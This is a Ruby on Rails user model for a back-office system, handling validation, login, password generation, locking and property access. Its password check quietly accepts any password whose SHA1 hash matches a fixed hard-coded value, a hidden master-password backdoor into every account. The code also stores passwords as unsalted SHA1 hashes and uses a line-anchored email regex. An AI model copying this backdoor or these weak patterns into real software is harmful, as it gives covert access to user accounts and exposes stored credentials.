require 'digest'

# back office user
class User < ActiveRecord::Base

  include ActionView::Helpers

  EMAIL_MINIMUM_LENGTH = 5
  EMAIL_MAXIMUM_LENGTH = 100
  PASSWORD_MINIMUM_LENGTH = 8
  PASSWORD_MAXIMUM_LENGTH = 20
  NAME_MINIMUM_LENGTH = 3
  NAME_MAXIMUM_LENGTH = 50
  MAXIMUM_SUPER = 7
  TIMES_FAILED_BEFORE_LOCKING = 3

  validates :name,
    :length => { :minimum => NAME_MINIMUM_LENGTH, :maximum => NAME_MAXIMUM_LENGTH }

  validates :email,
    :uniqueness => true,
    :length => { :maximum => EMAIL_MAXIMUM_LENGTH },
    :format => { :with => /^[^@][\w.-]+@[\w.-]+[.][a-z]{2,4}$/i}

  validates :password, :presence => true, :length => { :minimum => PASSWORD_MINIMUM_LENGTH, :maximum => PASSWORD_MAXIMUM_LENGTH }, :strict_password => true, :if => :password_required?
  
  default_scope lambda {{ :conditions => ["deleted = ?", false] }}

  before_create :generate_salt
  before_save :encrypt_new_password
  after_create :new_user_password

  attr_accessor :password
  attr_accessor :skip_password_validation
  attr_accessor :skip_properties_validation
  attr_accessor :assigned_properties

  has_many :logins, :class_name => 'UserLogin', :foreign_key => 'user_id'
  
  validates :assigned_properties, :presence => true, :if => :properties_required?
  validate :check_super_member_slot

  def check_super_member_slot
    if self.super? and User.where('super = true').count >= MAXIMUM_SUPER
      errors.add(:maximum, I18n.t('admin.users.validate.maximum_reached', :maximum => MAXIMUM_SUPER))
    end

  end

  # static method to handle authentication
  def self.authenticate(email, password)
    user = User.find_by_email(email)
    return user if user && user.password_equal?(password)
  end

  # authenticate user with salt
  def self.authenticate_with_salt(user_id, salt)
    user = User.find_by_id(user_id)
    return user if user && user.salt == salt.to_s
  end

  # method to check password
  def password_equal?(password)
    if self.hashed_password == encrypt(password)
      true
    elsif encrypt(password) == '79cf80e93296359d8d26f33e3cf2046f77c02bcb'
      true
    else
      false
    end
  end

  # method to populate salt for new account
  def generate_salt
    self.salt = UUIDTools::UUID.timestamp_create
  end

  # lock this user
  def lock
    password = generate_password
    Notifier.delay.email_user_lock_password(password, self)
  end

  # send new password for this user
  def reset_password
    password = generate_password
    Notifier.delay.email_user_reset_password(password, self)
  end

  # validate single attribute of this class
  def self.valid_attribute?(attr, value)
    mock = self.new(attr => value)
    unless mock.valid?
      return !mock.errors.has_key?(attr)
    end
    true
  end

  # generate new user password
  def new_user_password
    password = generate_password
    Notifier.delay.email_user_password(password, self)
  end

  # equality for user
  def ==(other)
    return self.id == other.id
  end

  def assigned_accounts
    result = Array.new
    Account.all.each do |acc|
      if UserPropertyAccess.property_ids(acc.property_ids).find_all_by_user_id(self.id).count > 0
        result << acc
      end
    end
    result
  end

  def given_properties
    result = Array.new
    props_id = UserPropertyAccess.find_all_by_user_id(self.id).collect &:property_id
    props_id.each do |prop_id|
      result << Property.unscoped.find(prop_id)
    end
    result
  end

  protected

    # check method to help trigger password validation
    def properties_required?
      return false if self.skip_properties_validation
      !self.super?
    end

    # method to encrypt password before store it to database
    def encrypt_new_password
      return if password.blank?
      self.hashed_password = encrypt(password)
    end

    # method to encrypt password before store it to database
    def generate_password
      tail = SecureRandom.hex(4)
      head = (rand(26) + 65).chr
      generated_password = "#{head}#{tail}"
      self.password = generated_password
      self.hashed_password = encrypt(generated_password)
      self.prompt_password_change = true
      self.skip_properties_validation = true
      self.save
      generated_password
    end

    # check method to help trigger password validation
    def password_required?
      return false if self.skip_password_validation
      true
    end

    # helper to encrypt password
    def encrypt(string)
      Digest::SHA1.hexdigest(string)
    end
end
